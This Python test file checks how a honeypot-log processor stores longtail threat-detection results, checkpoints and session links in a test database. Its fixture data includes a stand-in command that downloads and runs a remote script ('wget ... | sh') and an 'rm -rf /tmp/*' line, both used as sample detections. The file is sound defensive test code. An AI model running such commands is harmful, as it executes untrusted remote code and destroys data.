"""Integration tests for longtail analysis storage functionality."""

from __future__ import annotations

import os
import tempfile
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from cowrieprocessor.db import apply_migrations
from cowrieprocessor.db.models import (
    LongtailAnalysis,
    LongtailDetection,
    LongtailDetectionSession,
    SessionSummary,
)
from cowrieprocessor.threat_detection.longtail import LongtailAnalysisResult
from cowrieprocessor.threat_detection.storage import (
    _check_pgvector_available,
    compute_vocabulary_hash,
    create_analysis_checkpoint,
    get_analysis_checkpoint,
    store_longtail_analysis,
)


@pytest.fixture
def temp_db():
    """Create a temporary SQLite database for testing."""
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name

    engine = create_engine(f"sqlite:///{db_path}")
    apply_migrations(engine)

    yield engine

    # Cleanup
    os.unlink(db_path)


@pytest.fixture
def session_factory(temp_db):
    """Create a session factory for the test database."""
    return sessionmaker(bind=temp_db)


@pytest.fixture
def sample_sessions():
    """Create sample session summaries for testing."""
    sessions = []
    for i in range(5):
        session = SessionSummary(
            session_id=f"test_session_{i:03d}",
            first_event_at=datetime.now(UTC) - timedelta(hours=i),
            last_event_at=datetime.now(UTC) - timedelta(minutes=i * 30),
            event_count=10 + i,
            command_count=5 + i,
            file_downloads=i,
            login_attempts=1 + i,
            vt_flagged=False,
            dshield_flagged=False,
            risk_score=20 + i * 10,
            matcher="test_matcher",
        )
        sessions.append(session)
    return sessions


@pytest.fixture
def sample_analysis_result():
    """Create a sample longtail analysis result for testing."""
    return LongtailAnalysisResult(
        rare_command_count=3,
        anomalous_sequence_count=2,
        outlier_session_count=1,
        emerging_pattern_count=0,
        high_entropy_payload_count=0,
        total_events_analyzed=50,
        total_sessions_analyzed=5,
        analysis_duration_seconds=2.5,
        memory_usage_mb=128.5,
        vector_analysis_enabled=True,
        pgvector_available=False,
        rare_commands=[
            {
                "command": "suspicious_command_1",
                "frequency": 1,
                "rarity_score": 0.02,
                "detection_type": "rare_command",
                "sessions": [
                    {
                        "session_id": "test_session_001",
                        "src_ip": "192.168.1.100",
                        "timestamp": datetime.now(UTC),
                        "duration": 300.0,
                        "command_count": 5,
                    }
                ],
                "session_count": 1,
            },
            {
                "command": "suspicious_command_2",
                "frequency": 2,
                "rarity_score": 0.04,
                "detection_type": "rare_command",
                "sessions": [
                    {
                        "session_id": "test_session_002",
                        "src_ip": "192.168.1.101",
                        "timestamp": datetime.now(UTC),
                        "duration": 450.0,
                        "command_count": 6,
                    },
                    {
                        "session_id": "test_session_003",
                        "src_ip": "192.168.1.102",
                        "timestamp": datetime.now(UTC),
                        "duration": 200.0,
                        "command_count": 7,
                    },
                ],
                "session_count": 2,
            },
            {
                "command": "suspicious_command_3",
                "frequency": 1,
                "rarity_score": 0.03,
                "detection_type": "rare_command",
                "sessions": [
                    {
                        "session_id": "test_session_005",
                        "src_ip": "192.168.1.104",
                        "timestamp": datetime.now(UTC),
                        "duration": 350.0,
                        "command_count": 4,
                    }
                ],
                "session_count": 1,
            },
        ],
        anomalous_sequences=[
            {
                "sequence": "ls && rm -rf /tmp/*",
                "frequency": 1,
                "anomaly_score": 0.95,
                "detection_type": "anomalous_sequence",
            },
            {
                "sequence": "wget http://malicious.com/payload.sh | sh",
                "frequency": 2,
                "anomaly_score": 0.98,
                "detection_type": "anomalous_sequence",
            },
        ],
        outlier_sessions=[
            {
                "session_id": "test_session_004",
                "src_ip": "192.168.1.103",
                "duration": 1800.0,
                "command_count": 50,
                "login_attempts": 10,
                "file_operations": 5,
                "cluster_label": -1,
                "detection_type": "outlier_session",
            }
        ],
        emerging_patterns=[],
        high_entropy_payloads=[],
        statistical_summary={
            "confidence_score": 0.85,
            "data_quality_score": 0.92,
            "enrichment_coverage": 0.78,
        },
    )


class TestLongtailStorage:
    """Test longtail analysis storage functionality."""

    def test_store_longtail_analysis_basic(self, session_factory, sample_analysis_result, sample_sessions) -> None:
        """Test basic storage of longtail analysis results."""
        window_start = datetime.now(UTC) - timedelta(days=7)
        window_end = datetime.now(UTC)
        lookback_days = 7

        # Store the analysis
        analysis_id = store_longtail_analysis(
            session_factory=session_factory,
            result=sample_analysis_result,
            window_start=window_start,
            window_end=window_end,
            lookback_days=lookback_days,
        )

        assert analysis_id is not None
        assert analysis_id > 0

        # Verify the analysis record was created
        with session_factory() as session:
            analysis_record = session.query(LongtailAnalysis).filter_by(id=analysis_id).first()
            assert analysis_record is not None
            assert analysis_record.rare_command_count == 3
            assert analysis_record.anomalous_sequence_count == 2
            assert analysis_record.outlier_session_count == 1
            assert analysis_record.total_events_analyzed == 50
            assert analysis_record.confidence_score == 0.85

            # Verify detections were created
            detections = session.query(LongtailDetection).filter_by(analysis_id=analysis_id).all()
            assert len(detections) == 6  # 3 rare commands + 2 anomalous sequences + 1 outlier session

            # Verify rare command detections
            rare_command_detections = [d for d in detections if d.detection_type == "rare_command"]
            assert len(rare_command_detections) == 3

            # Verify session links were created for rare commands
            session_links = session.query(LongtailDetectionSession).all()
            assert len(session_links) == 4  # 1 + 2 + 1 sessions for the rare commands

    def test_pgvector_detection_sqlite(self, temp_db) -> None:
        """Test pgvector detection with SQLite (should return False)."""
        with temp_db.begin() as connection:
            has_pgvector = _check_pgvector_available(connection)
            assert has_pgvector is False

    def test_pgvector_detection_postgresql(self) -> None:
        """Test pgvector detection with PostgreSQL (if available)."""
        # This test would require a PostgreSQL database with pgvector
        # Skip if not available
        pytest.skip("PostgreSQL with pgvector not available in test environment")

    def test_analysis_checkpoints(self, session_factory) -> None:
        """Test analysis checkpoint functionality."""
        checkpoint_date = datetime.now(UTC).date()
        window_start = datetime.now(UTC) - timedelta(days=1)
        window_end = datetime.now(UTC)

        # Create a checkpoint
        create_analysis_checkpoint(
            session_factory=session_factory,
            checkpoint_date=checkpoint_date,
            window_start=window_start,
            window_end=window_end,
            sessions_analyzed=10,
            vocabulary_hash="test_hash_123",
            analysis_id=1,
        )

        # Retrieve the checkpoint
        checkpoint = get_analysis_checkpoint(session_factory, checkpoint_date)
        assert checkpoint is not None
        assert checkpoint["checkpoint_date"] == checkpoint_date
        assert checkpoint["sessions_analyzed"] == 10
        assert checkpoint["vocabulary_hash"] == "test_hash_123"
        assert checkpoint["last_analysis_id"] == 1

    def test_vocabulary_hash_computation(self) -> None:
        """Test vocabulary hash computation."""

        # Mock analyzer with vocabulary
        class MockAnalyzer:
            def __init__(self):
                self.command_vectorizer = MockVectorizer()

        class MockVectorizer:
            def __init__(self):
                self.is_fitted = True
                self.vectorizer = MockVectorizerInternal()

            def get_feature_names(self):
                return ["ls", "cd", "rm", "wget"]

        class MockVectorizerInternal:
            def __init__(self):
                self.vocabulary_ = {"ls": 0, "cd": 1, "rm": 2, "wget": 3}

        analyzer = MockAnalyzer()
        vocab_hash = compute_vocabulary_hash(analyzer)

        assert vocab_hash != "unfitted"
        assert vocab_hash != "error"
        assert len(vocab_hash) == 32  # MD5 hash length

    def test_storage_with_empty_results(self, session_factory) -> None:
        """Test storage with empty analysis results."""
        empty_result = LongtailAnalysisResult(
            rare_command_count=0,
            anomalous_sequence_count=0,
            outlier_session_count=0,
            emerging_pattern_count=0,
            high_entropy_payload_count=0,
            total_events_analyzed=0,
            total_sessions_analyzed=0,
            analysis_duration_seconds=1.0,
            memory_usage_mb=64.0,
            vector_analysis_enabled=False,
            pgvector_available=False,
            rare_commands=[],
            anomalous_sequences=[],
            outlier_sessions=[],
            emerging_patterns=[],
            high_entropy_payloads=[],
            statistical_summary={"confidence_score": 0.0},
        )

        window_start = datetime.now(UTC) - timedelta(days=1)
        window_end = datetime.now(UTC)

        analysis_id = store_longtail_analysis(
            session_factory=session_factory,
            result=empty_result,
            window_start=window_start,
            window_end=window_end,
            lookback_days=1,
        )

        assert analysis_id is not None

        # Verify no detections were created
        with session_factory() as session:
            detections = session.query(LongtailDetection).filter_by(analysis_id=analysis_id).all()
            assert len(detections) == 0

    def test_session_linking_integrity(self, session_factory, sample_analysis_result) -> None:
        """Test that session linking maintains referential integrity."""
        window_start = datetime.now(UTC) - timedelta(days=1)
        window_end = datetime.now(UTC)

        analysis_id = store_longtail_analysis(
            session_factory=session_factory,
            result=sample_analysis_result,
            window_start=window_start,
            window_end=window_end,
            lookback_days=1,
        )

        with session_factory() as session:
            # Get all session links
            session_links = session.query(LongtailDetectionSession).all()

            # Verify each link references valid detection and session
            for link in session_links:
                detection = session.query(LongtailDetection).filter_by(id=link.detection_id).first()
                assert detection is not None
                assert detection.analysis_id == analysis_id

                # Note: We can't verify session exists since we didn't create SessionSummary records
                # In a real test, we'd create the sessions first

    def test_error_handling(self, session_factory) -> None:
        """Test error handling in storage functions."""
        # Test with invalid data
        invalid_result = LongtailAnalysisResult(
            rare_command_count=-1,  # Invalid negative count
            total_events_analyzed=0,
            total_sessions_analyzed=0,
            analysis_duration_seconds=0.0,
            memory_usage_mb=0.0,
            vector_analysis_enabled=False,
            pgvector_available=False,
            rare_commands=[],
            anomalous_sequences=[],
            outlier_sessions=[],
            emerging_patterns=[],
            high_entropy_payloads=[],
            statistical_summary={},
        )

        window_start = datetime.now(UTC) - timedelta(days=1)
        window_end = datetime.now(UTC)

        # Should still work (database constraints will handle invalid data)
        analysis_id = store_longtail_analysis(
            session_factory=session_factory,
            result=invalid_result,
            window_start=window_start,
            window_end=window_end,
            lookback_days=1,
        )

        assert analysis_id is not None


class TestLongtailIntegration:
    """Integration tests for the complete longtail analysis flow."""

    def test_run_longtail_analysis_with_storage(self, temp_db, sample_sessions) -> None:
        """Test the complete flow from run_longtail_analysis to storage."""
        from cowrieprocessor.threat_detection.longtail import run_longtail_analysis

        # Create sessions in database
        session_factory = sessionmaker(bind=temp_db)
        with session_factory() as session:
            for sess in sample_sessions:
                session.add(sess)
            session.commit()

        # Run analysis with storage enabled
        result = run_longtail_analysis(
            db_url=f"sqlite:///{temp_db.url.database}",
            lookback_days=1,
            store_results=True,
        )

        assert result is not None
        assert result.total_sessions_analyzed >= 0

        # Verify results were stored
        with session_factory() as session:
            analyses = session.query(LongtailAnalysis).all()
            assert len(analyses) > 0

            detections = session.query(LongtailDetection).all()
            assert len(detections) >= 0  # May be 0 if no detections found
